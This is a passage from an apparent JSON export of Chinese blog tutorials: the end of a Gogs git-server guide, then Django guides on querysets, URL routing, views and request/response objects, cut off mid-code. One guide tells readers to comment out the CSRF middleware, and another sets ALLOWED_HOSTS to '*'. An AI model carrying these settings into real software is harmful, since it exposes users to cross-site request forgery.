src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTE3NTNmNDUxNTdmZTU2YTAucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>通过ssh方式克隆仓库</li>\n</ul><pre class=\"has\">\n<code>git clone ssh://git@111.230.254.173:10022/zhaoolee/zhaoolee-test-gogs.git \n</code></pre>\n\n<blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTAyNWQwNDI0MjAwNTdhZGEucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n \n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTRhNzRkNDY2ZDhjZmYzNTQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n \n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTA2MGVlMTllMTAxNGI0MGUucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<blockquote>\n<p>至此git服务搭建完成, 你可以邀请你的小伙伴, 来你的网站注册一个账户, 然后, 你们就可以协同开发一些好玩的项目了~</p>\n</blockquote>\n\n<ul><li>让队友注册一个新账户为<code>zhaozhao</code></li>\n</ul><blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTE0OTNiYzg5ODI2YzQwOGQucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>管理员<code>zhaoolee</code>主动搜索添加新队友<code>zhaozhao</code></li>\n</ul><blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLTlhNWU0MWFkY2YzMWU1MjYucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<ul><li>管理员可以进行权限设置</li>\n</ul><blockquote>\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8zMjAzODQxLWQ5MDFhMjBiMjc2ZTU2ZDgucG5nP2ltYWdlTW9ncjIvYXV0by1vcmllbnQvc3RyaXB8aW1hZ2VWaWV3Mi8yL3cvMTIwMC9mb3JtYXQvd2VicA?x-oss-process=image/format,png\"></p>\n</blockquote>\n\n<h2>小结</h2>\n\n<blockquote>\n<p>初见gogs, 我就被吸引到了, gogs功能强大, 设置简单, 完全开源, 对中文支持也很好, 如果你想建立自己的git站点, 而运维的经验又不怎么丰富, gogs是一个不错的选择~</p>\n</blockquote>\n                                    </div>", "log_PostTime": 1584891143, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 模型查询2.3", "log_Intro": "Django 模型查询2.3", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"简介\">简介</h1>\n\n<ul><li>查询集表示从数据库中获取的对象集合</li>\n\t<li>查询集可以含有零个、一个或多个过滤器</li>\n\t<li>过滤器基于所给的参数限制查询的结果</li>\n\t<li>从Sql的角度，查询集和select语句等价，过滤器像where和limit子句</li>\n\t<li>接下来主要讨论如下知识点\n\t<ul><li>查询集</li>\n\t\t<li>字段查询：比较运算符，F对象，Q对象</li>\n\t</ul></li>\n</ul><h1 id=\"查询集\">查询集</h1>\n\n<ul><li>在管理器上调用过滤器方法会返回查询集</li>\n\t<li>查询集经过过滤器筛选后返回新的查询集，因此可以写成链式过滤</li>\n\t<li><strong>惰性执行</strong>：创建查询集不会带来任何数据库的访问，直到调用数据时，才会访问数据库</li>\n\t<li>何时对查询集求值：迭代，序列化，与if合用</li>\n\t<li>返回查询集的方法，称为过滤器\n\t<ul><li>all()</li>\n\t\t<li>filter()</li>\n\t\t<li>exclude()</li>\n\t\t<li>order_by()</li>\n\t\t<li>values()：一个对象构成一个字典，然后构成一个列表返回</li>\n\t</ul></li>\n\t<li>写法：</li>\n</ul><pre class=\"has\">\n<code>filter(键1=值1,键2=值2)\n等价于\nfilter(键1=值1).filter(键2=值2)\n</code></pre>\n\n<ul><li>返回单个值的方法\n\t<ul><li>get()：返回单个满足条件的对象\n\t\t<ul><li>如果未找到会引发\"模型类.DoesNotExist\"异常</li>\n\t\t\t<li>如果多条被返回，会引发\"模型类.MultipleObjectsReturned\"异常</li>\n\t\t</ul></li>\n\t\t<li>count()：返回当前查询的总条数</li>\n\t\t<li>first()：返回第一个对象</li>\n\t\t<li>last()：返回最后一个对象</li>\n\t\t<li>exists()：判断查询集中是否有数据，如果有则返回True</li>\n\t</ul></li>\n</ul><p>限制查询集</p>\n\n<ul><li>查询集返回列表，可以使用下标的方式进行限制，等同于sql中的limit和offset子句</li>\n\t<li>注意：不支持负数索引</li>\n\t<li>使用下标后返回一个新的查询集，不会立即执行查询</li>\n\t<li>如果获取一个对象，直接使用[0]，等同于[0:1].get()，但是如果没有数据，[0]引发IndexError异常，[0:1].get()引发DoesNotExist异常</li>\n</ul><p>查询集的缓存</p>\n\n<ul><li>每个查询集都包含一个缓存来最小化对数据库的访问</li>\n\t<li>在新建的查询集中，缓存为空，首次对查询集求值时，会发生数据库查询，django会将查询的结果存在查询集的缓存中，并返回请求的结果，接下来对查询集求值将重用缓存的结果</li>\n\t<li>情况一：这构成了两个查询集，无法重用缓存，每次查询都会与数据库进行一次交互，增加了数据库的负载</li>\n</ul><pre class=\"has\">\n<code>print([e.title for e in Entry.objects.all()])\nprint([e.title for e in Entry.objects.all()])\n</code></pre>\n\n<ul><li>情况二：两次循环使用同一个查询集，第二次使用缓存中的数据</li>\n</ul><pre class=\"has\">\n<code>querylist=Entry.objects.all()\nprint([e.title for e in querylist])\nprint([e.title for e in querylist])\n</code></pre>\n\n<ul><li>何时查询集不会被缓存：当只对查询集的部分进行求值时会检查缓存，但是如果这部分不在缓存中，那么接下来查询返回的记录将不会被缓存，这意味着使用索引来限制查询集将不会填充缓存，如果这部分数据已经被缓存，则直接使用缓存中的数据</li>\n</ul><h1 id=\"字段查询\">字段查询</h1>\n\n<ul><li>实现where子名，作为方法filter()、exclude()、get()的参数</li>\n\t<li>语法：属性名称__比较运算符=值</li>\n\t<li><strong>表示两个下划线，左侧是属性名称，右侧是比较类型</strong></li>\n\t<li>对于外键，使用“属性名_id”表示外键的原始值</li>\n\t<li>转义：like语句中使用了%与<em>，匹配数据中的%与</em>，在过滤器中直接写，例如：filter(title__contains=\"%\")=&gt;where title like '%\\%%'，表示查找标题中包含%的</li>\n</ul><p>比较运算符</p>\n\n<ul><li>exact：表示判等，大小写敏感；如果没有写“<em> </em>比较运算符”，表示判等</li>\n</ul><pre class=\"has\">\n<code>filter(isDelete=False)\n</code></pre>\n\n<ul><li>contains：是否包含，大小写敏感</li>\n</ul><pre class=\"has\">\n<code>exclude(btitle__contains='传')\n</code></pre>\n\n<ul><li>startswith、endswith：以value开头或结尾，大小写敏感</li>\n</ul><pre class=\"has\">\n<code>exclude(btitle__endswith='传')\n</code></pre>\n\n<ul><li>isnull、isnotnull：是否为null</li>\n</ul><pre class=\"has\">\n<code>filter(btitle__isnull=False)\n</code></pre>\n\n<ul><li>在前面加个i表示不区分大小写，如iexact、icontains、istarswith、iendswith</li>\n\t<li>in：是否包含在范围内</li>\n</ul><pre class=\"has\">\n<code>filter(pk__in=[1, 2, 3, 4, 5])\n</code></pre>\n\n<ul><li>gt、gte、lt、lte：大于、大于等于、小于、小于等于</li>\n</ul><pre class=\"has\">\n<code>filter(id__gt=3)\n</code></pre>\n\n<ul><li>year、month、day、week_day、hour、minute、second：对日期间类型的属性进行运算</li>\n</ul><pre class=\"has\">\n<code>filter(bpub_date__year=1980)\nfilter(bpub_date__gt=date(1980, 12, 31))\n</code></pre>\n\n<ul><li>跨关联关系的查询：处理join查询\n\t<ul><li>语法：模型类名<em> </em>&lt;属性名&gt;<em> </em>&lt;比较&gt;</li>\n\t\t<li>注：可以没有__&lt;比较&gt;部分，表示等于，结果同inner join</li>\n\t\t<li>可返向使用，即在关联的两个模型中都可以使用</li>\n\t</ul></li>\n</ul><pre class=\"has\">\n<code>filter(heroinfo_ _hcontent_ _contains='八')\n</code></pre>\n\n<ul><li>查询的快捷方式：pk，pk表示primary key，默认的主键是id</li>\n</ul><pre class=\"has\">\n<code>filter(pk__lt=6)\n</code></pre>\n\n<p>聚合函数</p>\n\n<ul><li>使用aggregate()函数返回聚合函数的值</li>\n\t<li>函数：Avg，Count，Max，Min，Sum</li>\n</ul><pre class=\"has\">\n<code>from django.db.models import Max\nmaxDate = list.aggregate(Max('bpub_date'))\n</code></pre>\n\n<ul><li>count的一般用法：</li>\n</ul><pre class=\"has\">\n<code>count = list.count()\n</code></pre>\n\n<p>F对象</p>\n\n<ul><li>可以使用模型的字段A与字段B进行比较，如果A写在了等号的左边，则B出现在等号的右边，需要通过F对象构造</li>\n</ul><pre class=\"has\">\n<code>list.filter(bread__gte=F('bcommet'))\n</code></pre>\n\n<ul><li>django支持对F()对象使用算数运算</li>\n</ul><pre class=\"has\">\n<code>list.filter(bread__gte=F('bcommet') * 2)\n</code></pre>\n\n<ul><li>F()对象中还可以写作“模型类__列名”进行关联查询</li>\n</ul><pre class=\"has\">\n<code>list.filter(isDelete=F('heroinfo__isDelete'))\n</code></pre>\n\n<ul><li>对于date/time字段，可与timedelta()进行运算</li>\n</ul><pre class=\"has\">\n<code>list.filter(bpub_date__lt=F('bpub_date') + timedelta(days=1))\n</code></pre>\n\n<p>Q对象</p>\n\n<ul><li>过滤器的方法中关键字参数查询，会合并为And进行</li>\n\t<li>需要进行or查询，使用Q()对象</li>\n\t<li>Q对象(django.db.models.Q)用于封装一组关键字参数，这些关键字参数与“比较运算符”中的相同</li>\n</ul><pre class=\"has\">\n<code>from django.db.models import Q\nlist.filter(Q(pk_ _lt=6))\n</code></pre>\n\n<ul><li>Q对象可以使用&amp;（and）、|（or）操作符组合起来</li>\n\t<li>当操作符应用在两个Q对象时，会产生一个新的Q对象</li>\n</ul><pre class=\"has\">\n<code>list.filter(pk_ _lt=6).filter(bcommet_ _gt=10)\nlist.filter(Q(pk_ _lt=6) | Q(bcommet_ _gt=10))\n</code></pre>\n\n<ul><li>使用~（not）操作符在Q对象前表示取反</li>\n</ul><pre class=\"has\">\n<code>list.filter(~Q(pk__lt=6))\n</code></pre>\n\n<ul><li>可以使用&amp;|~结合括号进行分组，构造做生意复杂的Q对象</li>\n\t<li>过滤器函数可以传递一个或多个Q对象作为位置参数，如果有多个Q对象，这些参数的逻辑为and</li>\n\t<li>过滤器函数可以混合使用Q对象和关键字参数，所有参数都将and在一起，Q对象必须位于关键字参数的前面</li>\n</ul><h1 id=\"自连接\">自连接</h1>\n\n<ul><li>对于地区信息，属于一对多关系，使用一张表，存储所有的信息</li>\n\t<li>类似的表结构还应用于分类信息，可以实现无限级分类</li>\n\t<li>新建模型AreaInfo，生成迁移</li>\n</ul><pre class=\"has\">\n<code>class AreaInfo(models.Model):\n    atitle = models.CharField(max_length=20)\n    aParent = models.ForeignKey('self', null=True, blank=True)\n</code></pre>\n\n<ul><li>访问关联对象</li>\n</ul><pre class=\"has\">\n<code>上级对象：area.aParent\n下级对象：area.areainfo_set.all()\n</code></pre>\n\n<ul><li>加入测试数据（在workbench中，参见“省市区mysql.txt”）</li>\n\t<li>在booktest/views.py中定义视图area</li>\n</ul><pre class=\"has\">\n<code>from models import AreaInfo\ndef area(request):\n    area = AreaInfo.objects.get(pk=130100)\n    return render(request, 'booktest/area.html', {'area': area})\n</code></pre>\n\n<ul><li>定义模板area.html</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;地区&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n当前地区：{{area.atitle}}\n&lt;hr/&gt;\n上级地区：{{area.aParent.atitle}}\n&lt;hr/&gt;\n下级地区：\n&lt;ul&gt;\n    { %for a in area.areainfo_set.all%}\n    &lt;li&gt;{{a.atitle}}&lt;/li&gt;\n    { %endfor%}\n&lt;/ul&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>在booktest/urls.py中配置一个新的urlconf</li>\n</ul><pre class=\"has\">\n<code>urlpatterns = [\n    url(r'^area/$', views.area, name='area')\n]</code></pre>\n                                    </div>", "log_PostTime": 1584891144, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 视图URLconf3.1", "log_Intro": "Django 视图URLconf3.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"urlconf\">URLconf</h1>\n\n<ul><li>在settings.py文件中通过ROOT_URLCONF指定根级url的配置</li>\n\t<li>urlpatterns是一个url()实例的列表</li>\n\t<li>一个url()对象包括：\n\t<ul><li>正则表达式</li>\n\t\t<li>视图函数</li>\n\t\t<li>名称name</li>\n\t</ul></li>\n\t<li>编写URLconf的注意：\n\t<ul><li>若要从url中捕获一个值，需要在它周围设置一对圆括号</li>\n\t\t<li>不需要添加一个前导的反斜杠，如应该写作'test/'，而不应该写作'/test/'</li>\n\t\t<li>每个正则表达式前面的r表示字符串不转义</li>\n\t</ul></li>\n\t<li>请求的url被看做是一个普通的python字符串，进行匹配时不包括get或post请求的参数及域名</li>\n</ul><pre class=\"has\">\n<code>http://www.itcast.cn/python/1/?i=1&amp;p=new，只匹配“/python/1/”部分\n</code></pre>\n\n<ul><li>正则表达式非命名组，通过位置参数传递给视图</li>\n</ul><pre class=\"has\">\n<code>url(r'^([0-9]+)/$', views.detail, name='detail'),\n</code></pre>\n\n<ul><li>正则表达式命名组，通过关键字参数传递给视图，本例中关键字参数为id</li>\n</ul><pre class=\"has\">\n<code>url(r'^(?P&lt;id&gt;[0-9]+)/$', views.detail, name='detail'),\n</code></pre>\n\n<ul><li>参数匹配规则：优先使用命名参数，如果没有命名参数则使用位置参数</li>\n\t<li>每个捕获的参数都作为一个普通的python字符串传递给视图</li>\n\t<li>性能：urlpatterns中的每个正则表达式在第一次访问它们时被编译，这使得系统相当快</li>\n</ul><p>包含其它的URLconfs</p>\n\n<ul><li>在应用中创建urls.py文件，定义本应用中的urlconf，再在项目的settings中使用include()</li>\n</ul><pre class=\"has\">\n<code>from django.conf.urls import include, url\nurlpatterns = [\n    url(r'^', include('booktest.urls', namespace='booktest')),\n]\n</code></pre>\n\n<ul><li>匹配过程：先与主URLconf匹配，成功后再用剩余的部分与应用中的URLconf匹配</li>\n</ul><pre class=\"has\">\n<code>请求http://www.itcast.cn/booktest/1/\n在sesstings.py中的配置：\nurl(r'^booktest/', include('booktest.urls', namespace='booktest')),\n在booktest应用urls.py中的配置\nurl(r'^([0-9]+)/$', views.detail, name='detail'),\n匹配部分是：/booktest/1/\n匹配过程：在settings.py中与“booktest/”成功，再用“1/”与booktest应用的urls匹配\n</code></pre>\n\n<ul><li>使用include可以去除urlconf的冗余</li>\n\t<li>参数：视图会收到来自父URLconf、当前URLconf捕获的所有参数</li>\n\t<li>在include中通过namespace定义命名空间，用于反解析</li>\n</ul><p>URL的反向解析</p>\n\n<ul><li>如果在视图、模板中使用硬编码的链接，在urlconf发生改变时，维护是一件非常麻烦的事情</li>\n\t<li>解决：在做链接时，通过指向urlconf的名称，动态生成链接地址</li>\n\t<li>视图：使用django.core.urlresolvers.reverse()函数</li>\n\t<li>模板：使用url模板标签</li>\n</ul>                                    </div>", "log_PostTime": 1584891145, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 视图函数", "log_Intro": "Django 视图函数", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"定义视图\">定义视图</h1>\n\n<ul><li>本质就是一个函数</li>\n\t<li>视图的参数\n\t<ul><li>一个HttpRequest实例</li>\n\t\t<li>通过正则表达式组获取的位置参数</li>\n\t\t<li>通过正则表达式组获得的关键字参数</li>\n\t</ul></li>\n\t<li>在应用目录下默认有views.py文件，一般视图都定义在这个文件中</li>\n\t<li>如果处理功能过多，可以将函数定义到不同的py文件中</li>\n</ul><pre class=\"has\">\n<code>新建views1.py\n#coding:utf-8\nfrom django.http import HttpResponse\ndef index(request):\n    return HttpResponse(\"你好\")\n\n在urls.py中修改配置\nfrom . import views1\nurl(r'^$', views1.index, name='index'),\n</code></pre>\n\n<h1 id=\"错误视图\">错误视图</h1>\n\n<ul><li>Django原生自带几个默认视图用于处理HTTP错误</li>\n</ul><p>404 (page not found) 视图</p>\n\n<ul><li>defaults.page_not_found(request, template_name='404.html')</li>\n\t<li>默认的404视图将传递一个变量给模板：request_path，它是导致错误的URL</li>\n\t<li>如果Django在检测URLconf中的每个正则表达式后没有找到匹配的内容也将调用404视图</li>\n\t<li>如果在settings中DEBUG设置为True，那么将永远不会调用404视图，而是显示URLconf 并带有一些调试信息</li>\n\t<li>在templates中创建404.html</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n找不到了\n&lt;hr/&gt;\n{{request_path}}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>在settings.py中修改调试</li>\n</ul><pre class=\"has\">\n<code>DEBUG = False\nALLOWED_HOSTS = ['*', ]\n</code></pre>\n\n<ul><li>请求一个不存在的地址</li>\n</ul><pre class=\"has\">\n<code>http://127.0.0.1:8000/test/\n</code></pre>\n\n<p>500 (server error) 视图</p>\n\n<ul><li>defaults.server_error(request, template_name='500.html')</li>\n\t<li>在视图代码中出现运行时错误</li>\n\t<li>默认的500视图不会传递变量给500.html模板</li>\n\t<li>如果在settings中DEBUG设置为True，那么将永远不会调用505视图，而是显示URLconf 并带有一些调试信息</li>\n</ul><p>400 (bad request) 视图</p>\n\n<ul><li>defaults.bad_request(request, template_name='400.html')</li>\n\t<li>错误来自客户端的操作</li>\n\t<li>当用户进行的操作在安全方面可疑的时候，例如篡改会话cookie</li>\n</ul>                                    </div>", "log_PostTime": 1584891147, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django Request对象3.3", "log_Intro": "Django Request对象3.3", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"httpreqeust对象\">HttpReqeust对象</h1>\n\n<ul><li>服务器接收到http协议的请求后，会根据报文创建HttpRequest对象</li>\n\t<li>视图函数的第一个参数是HttpRequest对象</li>\n\t<li>在django.http模块中定义了HttpRequest对象的API</li>\n</ul><p>属性</p>\n\n<ul><li>下面除非特别说明，属性都是只读的</li>\n\t<li>path：一个字符串，表示请求的页面的完整路径，不包含域名</li>\n\t<li>method：一个字符串，表示请求使用的HTTP方法，常用值包括：'GET'、'POST'</li>\n\t<li>encoding：一个字符串，表示提交的数据的编码方式\n\t<ul><li>如果为None则表示使用浏览器的默认设置，一般为utf-8</li>\n\t\t<li>这个属性是可写的，可以通过修改它来修改访问表单数据使用的编码，接下来对属性的任何访问将使用新的encoding值</li>\n\t</ul></li>\n\t<li>GET：一个类似于字典的对象，包含get请求方式的所有参数</li>\n\t<li>POST：一个类似于字典的对象，包含post请求方式的所有参数</li>\n\t<li>FILES：一个类似于字典的对象，包含所有的上传文件</li>\n\t<li>COOKIES：一个标准的Python字典，包含所有的cookie，键和值都为字符串</li>\n\t<li>session：一个既可读又可写的类似于字典的对象，表示当前的会话，只有当Django 启用会话的支持时才可用，详细内容见“状态保持”</li>\n</ul><p>方法</p>\n\n<ul><li>is_ajax()：如果请求是通过XMLHttpRequest发起的，则返回True</li>\n</ul><h1 id=\"querydict对象\">QueryDict对象</h1>\n\n<ul><li>定义在django.http.QueryDict</li>\n\t<li>request对象的属性GET、POST都是QueryDict类型的对象</li>\n\t<li>与python字典不同，QueryDict类型的对象用来处理同一个键带有多个值的情况</li>\n\t<li>方法get()：根据键获取值\n\t<ul><li>只能获取键的一个值</li>\n\t\t<li>如果一个键同时拥有多个值，获取最后一个值</li>\n\t</ul></li>\n</ul><pre class=\"has\">\n<code>dict.get('键',default)\n或简写为\ndict['键']\n</code></pre>\n\n<ul><li>方法getlist()：根据键获取值\n\t<ul><li>将键的值以列表返回，可以获取一个键的多个值</li>\n\t</ul></li>\n</ul><pre class=\"has\">\n<code>dict.getlist('键',default)</code></pre>\n\n<h1 id=\"get属性\">GET属性</h1>\n\n<ul><li>QueryDict类型的对象</li>\n\t<li>包含get请求方式的所有参数</li>\n\t<li>与url请求地址中的参数对应，位于?后面</li>\n\t<li>参数的格式是键值对，如key1=value1</li>\n\t<li>多个参数之间，使用&amp;连接，如key1=value1&amp;key2=value2</li>\n\t<li>键是开发人员定下来的，值是可变的</li>\n\t<li>示例如下</li>\n\t<li>创建视图getTest1用于定义链接，getTest2用于接收一键一值，getTest3用于接收一键多值</li>\n</ul><pre class=\"has\">\n<code>def getTest1(request):\n    return render(request,'booktest/getTest1.html')\ndef getTest2(request):\n    return render(request,'booktest/getTest2.html')\ndef getTest3(request):\n    return render(request,'booktest/getTest3.html')\n</code></pre>\n\n<ul><li>配置url</li>\n</ul><pre class=\"has\">\n<code>url(r'^getTest1/$', views.getTest1),\nurl(r'^getTest2/$', views.getTest2),\nurl(r'^getTest3/$', views.getTest3),\n</code></pre>\n\n<ul><li>创建getTest1.html，定义链接</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n链接1：一个键传递一个值\n&lt;a href=\"/getTest2/?a=1&amp;b=2\"&gt;gettest2&lt;/a&gt;&lt;br&gt;\n链接2：一个键传递多个值\n&lt;a href=\"/getTest3/?a=1&amp;a=2&amp;b=3\"&gt;gettest3&lt;/a&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>完善视图getTest2的代码</li>\n</ul><pre class=\"has\">\n<code>def getTest2(request):\n    a=request.GET['a']\n    b=request.GET['b']\n    context={'a':a,'b':b}\n    return render(request,'booktest/getTest2.html',context)\n</code></pre>\n\n<ul><li>创建getTest2.html，显示接收结果</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\na:{{ a }}&lt;br&gt;\nb:{{ b }}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>完善视图getTest3的代码</li>\n</ul><pre class=\"has\">\n<code>def getTest3(request):\n    a=request.GET.getlist('a')\n    b=request.GET['b']\n    context={'a':a,'b':b}\n    return render(request,'booktest/getTest3.html',context)\n</code></pre>\n\n<ul><li>创建getTest3.html，显示接收结果</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\na:{% for item in a %}\n{{ item }}\n{% endfor %}\n&lt;br&gt;\nb:{{ b }}\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n\n<h1 id=\"post属性\">POST属性</h1>\n\n<ul><li>QueryDict类型的对象</li>\n\t<li>包含post请求方式的所有参数</li>\n\t<li>与form表单中的控件对应</li>\n\t<li>问：表单中哪些控件会被提交？</li>\n\t<li>答：控件要有name属性，则name属性的值为键，value属性的值为键，构成键值对提交\n\t<ul><li>对于checkbox控件，name属性一样为一组，当控件被选中后会被提交，存在一键多值的情况</li>\n\t</ul></li>\n\t<li>键是开发人员定下来的，值是可变的</li>\n\t<li>示例如下</li>\n\t<li>定义视图postTest1</li>\n</ul><pre class=\"has\">\n<code>def postTest1(request):\n    return render(request,'booktest/postTest1.html')\n</code></pre>\n\n<ul><li>配置url</li>\n</ul><pre class=\"has\">\n<code>url(r'^postTest1$',views.postTest1)\n</code></pre>\n\n<ul><li>创建模板postTest1.html</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form method=\"post\" action=\"/postTest2/\"&gt;\n    姓名：&lt;input type=\"text\" name=\"uname\"/&gt;&lt;br&gt;\n    密码：&lt;input type=\"password\" name=\"upwd\"/&gt;&lt;br&gt;\n    性别：&lt;input type=\"radio\" name=\"ugender\" value=\"1\"/&gt;男\n    &lt;input type=\"radio\" name=\"ugender\" value=\"0\"/&gt;女&lt;br&gt;\n    爱好：&lt;input type=\"checkbox\" name=\"uhobby\" value=\"胸口碎大石\"/&gt;胸口碎大石\n    &lt;input type=\"checkbox\" name=\"uhobby\" value=\"跳楼\"/&gt;跳楼\n    &lt;input type=\"checkbox\" name=\"uhobby\" value=\"喝酒\"/&gt;喝酒\n    &lt;input type=\"checkbox\" name=\"uhobby\" value=\"爬山\"/&gt;爬山&lt;br&gt;\n    &lt;input type=\"submit\" value=\"提交\"/&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>创建视图postTest2接收请求的数据</li>\n</ul><pre class=\"has\">\n<code>def postTest2(request):\n    uname=request.POST['uname']\n    upwd=request.POST['upwd']\n    ugender=request.POST['ugender']\n    uhobby=request.POST.getlist('uhobby')\n    context={'uname':uname,'upwd':upwd,'ugender':ugender,'uhobby':uhobby}\n    return render(request,'booktest/postTest2.html',context)\n</code></pre>\n\n<ul><li>配置url</li>\n</ul><pre class=\"has\">\n<code>url(r'^postTest2$',views.postTest2)\n</code></pre>\n\n<ul><li>创建模板postTest2.html</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n{{ uname }}&lt;br&gt;\n{{ upwd }}&lt;br&gt;\n{{ ugender }}&lt;br&gt;\n{{ uhobby }}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>注意：使用表单提交，注释掉settings.py中的中间件crsf</li>\n</ul><p> </p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891147, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django Response对象3.4", "log_Intro": "Django Response对象3.4", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"httpresponse对象\">HttpResponse对象</h1>\n\n<ul><li>在django.http模块中定义了HttpResponse对象的API</li>\n\t<li>HttpRequest对象由Django自动创建，HttpResponse对象由程序员创建</li>\n\t<li>不调用模板，直接返回数据</li>\n</ul><pre class=\"has\">\n<code>#coding=utf-8\nfrom django.http import HttpResponse\n\ndef index(request):\n    return HttpResponse('你好')\n</code></pre>\n\n<ul><li>调用模板</li>\n</ul><pre class=\"has\">\n<code>from django.http import HttpResponse\nfrom django.template import RequestContext, loader\n\ndef index(request):\n    t1 = loader.get_template('polls/index.html')\n    context = RequestContext(request, {'h1': 'hello'})\n    return HttpResponse(t1.render(context))\n</code></pre>\n\n<p>属性</p>\n\n<ul><li>content：表示返回的内容，字符串类型</li>\n\t<li>charset：表示response采用的编码字符集，字符串类型</li>\n\t<li>status_code：响应的HTTP响应状态码</li>\n\t<li>content-type：指定输出的MIME类型</li>\n</ul><p>方法</p>\n\n<ul><li>init ：使用页内容实例化HttpResponse对象</li>\n\t<li>write(content)：以文件的方式写</li>\n\t<li>flush()：以文件的方式输出缓存区</li>\n\t<li>set_cookie(key, value='', max_age=None, expires=None)：设置Cookie\n\t<ul><li>key、value都是字符串类型</li>\n\t\t<li>max_age是一个整数，表示在指定秒数后过期</li>\n\t\t<li>expires是一个datetime或timedelta对象，会话将在这个指定的日期/时间过期，注意datetime和timedelta值只有在使用PickleSerializer时才可序列化</li>\n\t\t<li>max_age与expires二选一</li>\n\t\t<li>如果不指定过期时间，则两个星期后过期</li>\n\t</ul></li>\n</ul><pre class=\"has\">\n<code>from django.http import HttpResponse\nfrom datetime import *\n\ndef index(request):\n    response = HttpResponse()\n    if request.COOKIES.has_key('h1'):\n        